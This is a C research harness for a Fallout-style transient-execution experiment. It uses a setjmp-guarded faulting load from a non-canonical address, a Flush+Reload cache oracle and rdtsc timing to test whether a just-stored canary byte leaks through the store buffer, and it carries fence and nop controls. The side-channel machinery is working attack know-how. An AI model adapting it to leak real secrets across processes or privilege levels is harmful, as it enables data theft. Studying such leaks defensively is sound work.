/*
 * Frequency rule, only after the stride-only Hayik recover stayed hot
 * (41/41, stride 0x1040, last-hit, -O0, CPU 1).
 *
 * Same setjmp loop. One stored byte, 0x41, at offset 200 (i*10 for i=20,
 * L1 set 3). The faulting load is non-canonical 0x9876543214321000+200.
 * The oracle touch is byte * 0x1040, with no xor and no and-mask.
 *
 * A forward of 0x41 touches slot 0x41, not slot 1. Slot 1 is the same L1
 * set and is logged only. Slot 0 is the negative control. One attempt
 * reloads all three.
 *
 * Hit: reload < 150. Round: 64 executions. Majority round: hits*2 > 64.
 * Repeatable in one process: majority_rounds*2 > ROUNDS (default 8).
 * Either sentence needs two processes.
 *
 * SURVIVES only if both runs have slot 0x41 repeatable on store, not on
 * nostore, and slot 0 not repeatable on store. No origin claim.
 * ABSENT only if both runs have slot 0x41 not repeatable on store.
 *
 * FENCE=1 adds one mfence between the store and the setjmp/maccess fault
 * in every attempt. It is the control for the fresh-page TIMES path
 * (TIMES=1 FRESH=1 FENCE=1). Recorded without it: FRESH store 62/64 and
 * FRESH nostore 0/64 reloads under 150. Pre-registered, two processes:
 *   KILL: both runs have slot 0x41 not repeatable on FRESH+FENCE (about
 *   0/64). The sampled value needs the un-drained store; the hot line does
 *   not survive the store becoming globally visible.
 *   SURVIVES: both runs still show a majority hot on FRESH+FENCE. The hot
 *   line outlives the drained store, so that sequence does not support the
 *   store-buffer-entry reading.
 * A mixed rate is not evidence for either sentence.
 *
 * LFENCE=1 is the same control with lfence instead of mfence: an ordered
 * delay that does not wait for the store to become globally visible.
 * Pre-registered for TIMES=1 FRESH=1 LFENCE=1, two processes:
 *   STILL-HOT: both runs keep a majority hot (about 62/64) -> the mfence
 *   kill is specific to drain/global visibility, not to the added delay.
 *   DIES: both runs read about 0/64 -> distance alone can kill the rate in
 *   this sequence, so the mfence sentence stays sequence-local.
 * A mixed rate is not evidence for either sentence.
 *
 * NOPS=<n> inserts n nops between the store and the fault (8, 32, 128 or
 * 512; no fence semantics). Records: one process per n; the boundary value
 * gets a second process before any sentence. If the rate stays near 62/64
 * up to 512 nops, the mfence and lfence kills are about their ordering
 * semantics, not distance; if it collapses at 8 or 32, plain distance
 * closes the window and the fence results are distance kills.
 *
 * CLASSKEY=1 replaces the byte index with ((b ^ 0x3f) & 0x3f) * STRIDE and
 * the TIMES path measures slot 62 instead of slot 65 (the transform the
 * class-key binary `fallout-oneshot.c` uses, whose class 61 stays cold
 * there). Pre-registered, two processes, TIMES=1 FRESH=1 CLASSKEY=1: if
 * slot 62 is hot on store and cold on nostore, the transform survives in
 * this working sequence and the class-key negatives in `fallout-oneshot.c`
 * come from its other differences; if slot 62 is cold on store, the
 * transform itself removes the byte from the index in this sequence and
 * explains those negatives. In CLASSKEY mode the TIMES path also reloads
 * slot 63, the zero-mode target ((0x00 ^ 0x3f) & 0x3f), in the same
 * attempt. Companion reading: slot 63 hot with slot 62 cold means the touch
 * still happens with a zero-like value and the byte is what dies; both cold
 * means no visible touch at all in that configuration. CLASSKEY=1 without
 * TIMES exits: the rate path stays byte-key.
 *
 * Every run prints the CPU1 scaling frequency in the banner and after the
 * TIMES run (clk_khz, times_clock) so the log carries its clock state.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define STRIDE     0x1040
#define HOT_CYCLES 150
#define OFFSET     200
static int canary = 0x41; /* default; CANARY=<hex> overrides */
#define CANARY     canary
#define SLOT_BYTE  CANARY
#define SLOT_CLASS (CANARY & 0x3f) /* 1, logged, not the sentence */
#define SLOT_CLASSKEY ((CANARY ^ 0x3f) & 0x3f) /* 62; CLASSKEY=1 sentence */
#define SLOT_ZEROMODE 63 /* (0x00 ^ 0x3f) & 0x3f; CLASSKEY companion */
#define SLOT_ZERO  0
#define NC_BASE    0x9876543214321000ull
#define TRIALS     64

static char __attribute__((aligned(4096))) oracle_lo[256 * STRIDE];
static uint8_t *victim;
static jmp_buf trycatch_buf;
static int rounds = 8;
static int use_fence = 0;
static int use_lfence = 0;
static int use_nops = 0;
static int use_classkey = 0;

static void unblock(int sig)
{
    sigset_t set;

    sigemptyset(&set);
    sigaddset(&set, sig);
    sigaddset(&set, SIGFPE);
    sigprocmask(SIG_UNBLOCK, &set, NULL);
}

static void handler(int sig)
{
    unblock(sig);
    longjmp(trycatch_buf, 1);
}

#ifdef INLINE_ACCESS
static __attribute__((always_inline)) inline void maccess(void *p)
#else
static void maccess(void *p)
#endif
{
    asm volatile("movq (%0), %%rax\n" :: "c"(p) : "rax");
}

static void flush_line(void *p)
{
    asm volatile("clflush (%0)\n\tmfence\n\tlfence\n" :: "r"(p) : "memory");
}

static uint64_t reload_time(void *p)
{
    unsigned lo, hi;
    uint64_t a, b;

    asm volatile("mfence\n\tlfence\n\trdtsc" : "=a"(lo), "=d"(hi) :: "memory");
    a = ((uint64_t)hi << 32) | lo;
    asm volatile("mov (%0), %%eax" :: "r"(p) : "eax", "memory");
    asm volatile("lfence\n\trdtsc" : "=a"(lo), "=d"(hi) :: "memory");
    b = ((uint64_t)hi << 32) | lo;
    return b - a;
}

static void do_nops(void)
{
    switch (use_nops) {
    case 8:
        asm volatile(".rept 8\n\tnop\n\t.endr" ::: "memory");
        break;
    case 32:
        asm volatile(".rept 32\n\tnop\n\t.endr" ::: "memory");
        break;
    case 128:
        asm volatile(".rept 128\n\tnop\n\t.endr" ::: "memory");
        break;
    case 512:
        asm volatile(".rept 512\n\tnop\n\t.endr" ::: "memory");
        break;
    default:
        break;
    }
}

static void attempt(int do_store)
{
    unsigned char *attacker = (unsigned char *)NC_BASE;
    size_t idx;

    if (do_store)
        victim[OFFSET] = CANARY;
    if (use_nops)
        do_nops();
    if (use_fence)
        asm volatile("mfence" ::: "memory");
    else if (use_lfence)
        asm volatile("lfence" ::: "memory");
    if (!setjmp(trycatch_buf)) {
        if (use_classkey)
            idx = (size_t)((attacker[OFFSET] ^ 0x3f) & 0x3f);
        else
            idx = (size_t)attacker[OFFSET];
        maccess(oracle_lo + (size_t)STRIDE * idx);
    }
}

static void measure(int do_store, int *h_byte, int *h_class, int *h_zero)
{
    char *slot_b = oracle_lo + (size_t)STRIDE * SLOT_BYTE;
    char *slot_c = oracle_lo + (size_t)STRIDE * SLOT_CLASS;
    char *slot_z = oracle_lo + (size_t)STRIDE * SLOT_ZERO;
    int i;

    *h_byte = *h_class = *h_zero = 0;
    for (i = 0; i < TRIALS; i++) {
        uint64_t tb, tc, tz;

        flush_line(slot_b);
        flush_line(slot_c);
        flush_line(slot_z);
        attempt(do_store);
        tb = reload_time(slot_b);
        tc = reload_time(slot_c);
        tz = reload_time(slot_z);
        if (tb < HOT_CYCLES)
            (*h_byte)++;
        if (tc < HOT_CYCLES)
            (*h_class)++;
        if (tz < HOT_CYCLES)
            (*h_zero)++;
    }
}

static uint8_t *mmap_anon(void)
{
    uint8_t *p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED) {
        fprintf(stderr, "mmap: %s\n", strerror(errno));
        return NULL;
    }
    return p;
}

static int pin_cpu(void)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(1, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0)
        return -1;
    return sched_getcpu() == 1 ? 0 : -1;
}

static long read_cur_freq(void)
{
    FILE *f = fopen("/sys/devices/system/cpu/cpu1/cpufreq/scaling_cur_freq",
                    "r");
    long v;

    if (f == NULL)
        return -1;
    if (fscanf(f, "%ld", &v) != 1)
        v = -1;
    fclose(f);
    return v;
}

int main(void)
{
    struct sigaction sa;
    const char *s;
    char *end;
    long v;
    int arm, rnd;

    setvbuf(stdout, NULL, _IOLBF, 0);
    s = getenv("ROUNDS");
    if (s && *s) {
        v = strtol(s, &end, 0);
        if (*end || v < 1 || v > 64)
            return 2;
        rounds = (int)v;
    }
    s = getenv("CANARY");
    if (s && *s) {
        v = strtol(s, &end, 0);
        if (*end || v < 0 || v > 255) {
            fprintf(stderr, "CANARY must be a byte (0..255)\n");
            return 2;
        }
        canary = (int)v;
    }
    if (getenv("FENCE") != NULL)
        use_fence = 1;
    if (getenv("LFENCE") != NULL)
        use_lfence = 1;
    s = getenv("NOPS");
    if (s && *s) {
        v = strtol(s, &end, 0);
        if (*end || (v != 8 && v != 32 && v != 128 && v != 512)) {
            fprintf(stderr, "NOPS must be 8, 32, 128 or 512\n");
            return 2;
        }
        use_nops = (int)v;
    }
    if (getenv("CLASSKEY") != NULL)
        use_classkey = 1;
    if (use_classkey && getenv("TIMES") == NULL) {
        fprintf(stderr, "CLASSKEY is TIMES-only\n");
        return 2;
    }
    if (pin_cpu() != 0)
        return 2;
    /*
     * FRESH=1 maps a new page for each timed attempt and does not write
     * offset 0. Without it the page is the long-lived one from the rate runs.
     */
    if (getenv("FRESH") == NULL) {
        victim = mmap_anon();
        if (victim == NULL)
            return 2;
        victim[0] = 0;
        asm volatile("mfence" ::: "memory");
    }

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = handler;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGSEGV, &sa, NULL) != 0)
        return 2;

    printf("ref-rate: cpu=1 byte=0x%02x slot=%d class_log=%d offset=%d "
           "trials=%d rounds=%d hot<%d clk_khz=%ld\n",
           CANARY, SLOT_BYTE, SLOT_CLASS, OFFSET, TRIALS, rounds, HOT_CYCLES,
           read_cur_freq());
    printf("rule: sentence uses slot %d, not slot %d. Two processes. "
           "No origin claim.\n",
           use_classkey ? SLOT_CLASSKEY : SLOT_BYTE, SLOT_CLASS);

    /*
     * TIMES=1: 64 reload times of the stored byte's line, then one reload
     * time of slot 0. Store arm only. Slot 1 is not touched. Same page as
     * the rate runs: one mapping, victim[0] = 0 before the loop.
     */
    if (getenv("TIMES") != NULL) {
        int slotnum = use_classkey ? SLOT_CLASSKEY : SLOT_BYTE;
        char *slot_m = oracle_lo + (size_t)STRIDE * slotnum;
        char *slot_z = oracle_lo + (size_t)STRIDE * SLOT_ZERO;
        char *slot_zm = oracle_lo + (size_t)STRIDE * SLOT_ZEROMODE;
        int fresh = getenv("FRESH") != NULL;
        int do_store = getenv("NOSTORE") == NULL;
        int i;
        int hits = 0;
        int hits_zm = 0;

        printf("times arm=%s page=%s fence=%d lfence=%d nops=%d classkey=%d "
               "pretouch_offset0=%d slot1=not_measured\n",
               do_store ? "store" : "nostore",
               fresh ? "fresh" : "one", use_fence, use_lfence, use_nops,
               use_classkey, fresh ? 0 : 1);
        for (i = 0; i < TRIALS; i++) {
            uint64_t tb, tm;

            if (fresh) {
                if (victim != NULL)
                    munmap(victim, 0x1000);
                victim = mmap_anon();
                if (victim == NULL)
                    return 2;
            }
            flush_line(slot_m);
            if (use_classkey)
                flush_line(slot_zm);
            attempt(do_store);
            tb = reload_time(slot_m);
            if (tb < HOT_CYCLES)
                hits++;
            printf("t%d %d %llu\n", slotnum, i, (unsigned long long)tb);
            if (use_classkey) {
                tm = reload_time(slot_zm);
                if (tm < HOT_CYCLES)
                    hits_zm++;
                printf("t%d %d %llu\n", SLOT_ZEROMODE, i,
                       (unsigned long long)tm);
            }
        }
        if (fresh) {
            if (victim != NULL)
                munmap(victim, 0x1000);
            victim = mmap_anon();
            if (victim == NULL)
                return 2;
        }
        flush_line(slot_z);
        attempt(do_store);
        printf("t0 %llu\n", (unsigned long long)reload_time(slot_z));
        printf("times_result: arm=%s page=%s fence=%d lfence=%d nops=%d "
               "classkey=%d slot%d_hot=%d/%d hot<%d\n",
               do_store ? "store" : "nostore", fresh ? "fresh" : "one",
               use_fence, use_lfence, use_nops, use_classkey, slotnum,
               hits, TRIALS, HOT_CYCLES);
        if (use_classkey)
            printf("times_result: companion slot%d_hot=%d/%d hot<%d\n",
                   SLOT_ZEROMODE, hits_zm, TRIALS, HOT_CYCLES);
        printf("times_clock: clk_khz=%ld\n", read_cur_freq());
        return 0;
    }

    for (arm = 0; arm < 2; arm++) {
        int maj_b = 0, maj_z = 0;
        const char *name = arm ? "store" : "nostore";

        for (rnd = 0; rnd < rounds; rnd++) {
            int hb, hc, hz, mb, mz;

            measure(arm, &hb, &hc, &hz);
            mb = hb * 2 > TRIALS;
            mz = hz * 2 > TRIALS;
            if (mb)
                maj_b++;
            if (mz)
                maj_z++;
            printf("rate arm=%s round=%d slot%d=%d/%d majority=%d "
                   "slot%d=%d/%d slot0=%d/%d majority=%d\n",
                   name, rnd, SLOT_BYTE, hb, TRIALS, mb,
                   SLOT_CLASS, hc, TRIALS, hz, TRIALS, mz);
        }
        printf("rate arm=%s slot%d_rounds=%d/%d repeatable=%d "
               "slot0_rounds=%d/%d repeatable=%d\n",
               name, SLOT_BYTE, maj_b, rounds, maj_b * 2 > rounds,
               maj_z, rounds, maj_z * 2 > rounds);
    }
    printf("rate_result: rates only, two-run rule is outside this process\n");
    return 0;
}
